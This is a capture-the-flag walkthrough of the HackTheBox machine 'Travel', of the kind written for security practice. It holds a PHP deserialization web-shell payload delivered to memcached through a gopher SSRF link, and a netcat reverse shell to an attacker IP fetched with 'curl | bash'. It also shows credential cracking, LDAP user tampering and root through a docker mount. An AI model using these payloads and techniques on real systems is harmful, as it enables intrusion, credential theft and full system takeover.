---
title: "HTB: Travel"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Travel](https://i.ibb.co/J2s2ynz/Travel.png)

# Travel

[[toc]]

## Initial Enumeration


Whatweb:

```
whatweb --color=never --no-errors -a 3 -v http://10.10.10.189:80 2>&1
```

Possible email from whatweb: hello@travel.htb

Alternate domains from nmap on 443: 

```
Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
```

## Pillaging .git directory

Visiting blog-dev.travel.htb directly gives us a forbidden (403) error. However, doing a ffuf scan on blog-dev.travel.htb reveals a .git directory. We can use git-dumper to dump this folder:

https://github.com/arthaud/git-dumper

```
python3 git-dumper/git-dumper.py http://blog-dev.travel.htb gitfetch
```

## Looking through our Spoils

cding into gitfetch/.git and running git log gives us another email: jane@travel.htb

```
git log

Author: jane <jane@travel.htb>
Date:   Tue Apr 21 01:34:54 2020 -0700

    moved to git
```

In template.php, we see a really interesting function (url_get_contents) that appears to sanitize a user supplied command and passes it to curl:

```
function safe($url)
{
        // this should be secure
        $tmpUrl = urldecode($url);
        if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
        {
                die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
        }
        if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
        {
                die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
        }
        $tmp = parse_url($url, PHP_URL_HOST);
        // preventing all localhost access
        if($tmp == "localhost" or $tmp == "127.0.0.1")
        {
                die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");
        }
        return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        $output = shell_exec($pl);
    return $output;
}
```

In rss_template.php we see another interesting section, that seems to have a debug section:

```
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
```

On first glance, adding ?debug=ANYTHING HERE just spits out nonsense in the form of a serialized php object:

```
<!--
DEBUG
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
-->
```

However, if we look at the code for rss_template again, we see something interesting. The url we provide for debug.php to curl needs to include the word "custom_feed_url" or it won't work:

```
        $url = $_SERVER['QUERY_STRING'];
        if(strpos($url, "custom_feed_url") !== false){
                $tmp = (explode("=", $url));    
                $url = end($tmp);       
         } else {
                $url = "http://www.travel.htb/newsfeed/customfeed.xml";
         }
         $feed = get_feed($url); 
```

If we check out what the function that houses this segment is doing, we see that it's calling url_get_contents from template.php. url_get_contents sanitizes the input using safe($url) in template.php as well, then passes it to curl and executes it.

If we read README.md, we can see that the locations of template.php, rss_template.php and debug.php are in /wp-content/themes/twentytwenty. 

## Building our Exploit

In order to bypass the SSRF filter that template.php has on it, we'll just use http://LOCALHOST instead of http://localhost. 

The page isn't vulnerable to any useful XXE injection. While the RSS parser is properly parsing XML, it seems to quit if it sees SYSTEM in the <!ENTITY field, which we need.

Visiting http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php shows us a part of the key put into memcache, but not the whole thing. The first time we request a file from our local server, it makes two requests: 1 for curl and 1 for memcached to cache the page.

Because memcached is caching the page, we can use the SSRF vulnerability to inject keys and data into memcached. Using the information we've gathered from template/rss_template.php and the small amount of info in debug.php, we can see that the data is being stored in a serialized form inside of memcached, which means it's being deserialized when its pulled from the cache.

In order to build the exploit locally, we can set up a WordPress server using the instructions in the README we grabbed earlier (which I'll skip, as it's a bit of a process).

Note: TemplateHelper is the vulnerable portion of this webapp. Using the link I posted below, I found similarities between the example in the tutorial and the TemplateHelper function being used.

We can follow the directions on the following page to build an exploit, substituting the keys and data.

Useful: https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/

The payload looks like this:

```
O:14:"TemplateHelper":2:{s:4:"file";s:7:"poc.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}
```

We can run this through gopherus, to give ourselves a useable link:

```
https://github.com/tarunkant/Gopherus
```

```
gopherus --exploit phpmemcache


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:7:"poc.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20100%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22poc.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

After everything done, you can delete memcached item by using this payload: 

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```

We'll need to swap out "SpyD3r" for the key name that the website is caching www.travel.htb/newsfeed/customfeed.xml under. In order to do that, we can inject our own local webserver with the payload, and see what it enters into memcached. 

We'll visit the following link to inject the payload:

http://127.0.0.1/awesome-rss/?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aset%20SpyD3r%204%200%20100%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22poc.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

```
nc -nv 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
stats items
STAT items:16:number 1
STAT items:16:age 13
STAT items:16:evicted 0
STAT items:16:evicted_nonzero 0
STAT items:16:evicted_time 0
STAT items:16:outofmemory 0
STAT items:16:tailrepairs 0
STAT items:16:reclaimed 0
STAT items:16:expired_unfetched 0
STAT items:16:evicted_unfetched 0
STAT items:16:crawler_reclaimed 0
STAT items:16:crawler_items_checked 0
STAT items:16:lrutail_reflocked 0
END
stats cachedump 16 1
ITEM xct_4e5612ba079c530a6b1f148c0b352241 [2736 b; 1589998736 s]
END
```

Now that we have the key name, we can swap that out in our payload, and use it on the victim!

We'll visit the link with our updated payload:

http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20100%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:7:%22poc.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

Now, we just need to visit http://blog.travel.htb/awesome-rss/ to trigger it!

## Finding Our Webshell

If we look at the TemplateHelper function, it's writing to the /wp-content/themes/twentytwenty/logs/ directory, which means our shell will be at http://blog.travel.htb/WordPress/wp-content/themes/twentytwenty/logs/poc.php

http://blog.travel.htb/wp-content/themes/twentytwenty/logs/poc.php?cmd=id:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

## Popping a Shell

To pop our shell, we can host the following shell.sh script on our webserver:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 4444 >/tmp/f
```

Now, we just need to url encode the payload and curl it into bash:

```
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/poc.php?cmd=curl%20http%3a%2f%2f10.10.xx.xx%2fshell.sh%20|%20bash

$ whoami
www-data
```

## Upgrading our Shell

This box doesn't have python or python3 installed, and the perl tty upgrade doesn't want to work. Instead, we'll use Postshell to give ourselves a fully interactive shell:

```
git clone https://github.com/rek7/postshell
cd postshell && sh compile.sh
```

Now, we can curl this onto the victim's box (since we don't have wget), chmod it and execute it:

```
cd /var/tmp
curl http://10.10.xx.xx/stub -o stub

chmod +x stub
./stub 10.10.xx.xx 4444

www-data@blog:/var/tmp$ whoami
www-data
```

## Internal Enumeration


We find some credentials in wp-config.php:

**wp:fiFtDDV9LYe8Ti**

Looking around the database doesn't show us anything interesting. However, running lse.sh shows us that a backup of the database exists:

```
-rw-r--r-- 1 root root 1190388 Apr 24 06:39 /opt/wordpress/backup-13-04-2020.sql
```

If we pull this to our local machine, we can load it into mysql:

```
mysql -u****** -p******* --database=wp < backup.sql

use wp
select * from wp_users;

+----+-------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+---------------+
| ID | user_login  | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name  |
+----+-------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+---------------+
|  1 | admin       | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin         |
|  2 | lynik-admin | $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc. | lynik-admin   | lynik@travel.htb |                  | 2020-04-13 13:36:18 |                     |           0 | Lynik Schmidt |
+----+-------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+---------------+
```

We can save that new hash to a file called hashes.txt to crack with hashcat:

```
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt --force 
```

It decodes to "1stepcloser".

Trying to ssh in with lynik gives us a "public key denied" error, but we can ssh in with the username lynik-admin!

**lynik-admin:1stepcloser**

## Internal Host Enumeration

Looking in lynik-admin's home folder, we see two interesting files: .viminfo and .ldaprc:

.viminfo:
```
...
# Registers:
""1     LINE    0
        BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
...
```

.ldaprc:
```
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

We have ldapsearch present on the box, and we can take a look at the /etc/hosts file to see where the ldap server is located:

/etc/hosts:
```
127.0.0.1 localhost
127.0.1.1 travel
172.20.0.10 ldap.travel.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, using the information in .ldaprc and the BINDPW in .viminfo, we can dump the ldap server:

```
ldapsearch -w Theroadlesstraveled -D "cn=lynik-admin,dc=travel,dc=htb" -b "dc=travel,dc=htb" -h ldap.travel.htb

# extended LDIF                                           
#                                                         
# LDAPv3                                                  
# base <dc=travel,dc=htb> with scope subtree              
# filter: (objectclass=*)                                                                                            
# requesting: ALL                                         
#                                                         
                                                                                                                     
# travel.htb                                              
dn: dc=travel,dc=htb                                      
objectClass: top                                          
objectClass: dcObject                                                                                                
objectClass: organization                                 
o: Travel.HTB                                             
dc: travel                                                                                                           
                                                          
# admin, travel.htb                                       
dn: cn=admin,dc=travel,dc=htb                             
objectClass: simpleSecurityObject                         
objectClass: organizationalRole                           
cn: admin                                                 
description: LDAP administrator                                                                                      
                                                          
# servers, travel.htb                                     
dn: ou=servers,dc=travel,dc=htb                                                                                      
description: Servers                                      
objectClass: organizationalUnit                           
ou: servers                                               
                                                                                                                     
# lynik-admin, travel.htb                                 
dn: cn=lynik-admin,dc=travel,dc=htb                       
description: LDAP administrator                                                                                      
objectClass: simpleSecurityObject                         
objectClass: organizationalRole                           
cn: lynik-admin                                           
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
 =                              
 ...
 # domainusers, groups, linux, servers, travel.htb
dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
memberUid: frank
memberUid: brian
memberUid: christopher
memberUid: johnny
memberUid: julia
memberUid: jerry
memberUid: louise
memberUid: eugene
memberUid: edward
memberUid: gloria
memberUid: lynik
gidNumber: 5000
cn: domainusers
objectClass: top
objectClass: posixGroup

# search result
search: 2
result: 0 Success

# numResponses: 22
# numEntries: 21
```

That hashed password decodes to "Theroadlesstraveled" which we already knew.

We can edit one of the users to allow us to SSH in under another user id, with a ldif file:

new.ldif:

```
dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: userPassword
userPassword: {SSHA}0JZzQwnVI4FkqtTkzQYLUcvd7SpF1QbDcTRmkw==
-
replace: uidNumber
uidNumber: 1000
-
replace: gidNumber
gidNumber: 1000
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: (your id_rsa.pub key here)
```

Now, we can use ldapmodify to put these changes into effect:

ldapmodify -a -H ldap://ldap.travel.htb -x -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f new.ldif 

Now, we can just ssh in!

```
ssh -i ~/.ssh/id_rsa frank@10.10.10.189

trvl-admin@travel:~$ id
uid=1000(trvl-admin) gid=1000(trvl-admin) groups=1000(trvl-admin),5000(domainusers) 
```

Strangely, it seems like some of the groups that trvl-admin was in have been stripped. To get the correct shell, we'll just create a file in /home/trvl-admin/.ssh names authorized_keys and put our id_rsa.pub key in it.

Now, if we ssh in as trvl-admin instead of frank, we'll get a shell with the correct groups:

```
trvl-admin@travel:~$ id
uid=1000(trvl-admin) gid=1000(trvl-admin) groups=1000(trvl-admin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

From here, we aren't able to do much, since lxd gives us an error (since it isn't contained). Because we have docker on the box (group 117) we can use a docker privesc method:

new.ldif:

```
dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: userPassword
userPassword: {SSHA}0JZzQwnVI4FkqtTkzQYLUcvd7SpF1QbDcTRmkw==
-
replace: uidNumber
uidNumber: 1000
-
replace: gidNumber
gidNumber: 117
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: <your key here>
```

Now, we just need to run it, then ssh in:

```
ldapmodify -a -H ldap://ldap.travel.htb -x -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f new.ldif 

ssh -i ~/.ssh/id_rsa eugene@10.10.10.189

trvl-admin@travel:~$ id                                                                                              
uid=1000(trvl-admin) gid=117(docker) groups=117(docker),5000(domainusers) 
```

Now, using docker, we can list images:

```
trvl-admin@travel:~$ docker image list
REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
nginx                 latest              602e111c06b6        4 weeks ago         127MB
memcached             latest              ac4488374c89        4 weeks ago         82.3MB
blog                  latest              4225bf7c5157        6 weeks ago         981MB
ubuntu                18.04               4e5021d210f6        2 months ago        64.2MB
jwilder/nginx-proxy   alpine              a7a1c0b44c8a        3 months ago        54.6MB
osixia/openldap       latest              4c780dfa5f5e        8 months ago        275MB
```

Trying ubuntu gives us an error, but we know that blog has a full OS on it, so we'll use that:

```
docker run -v /:/mnt --rm -it blog chroot /mnt sh 

# id
uid=0(root) gid=0(root) groups=0(root)
```

Voila, root!
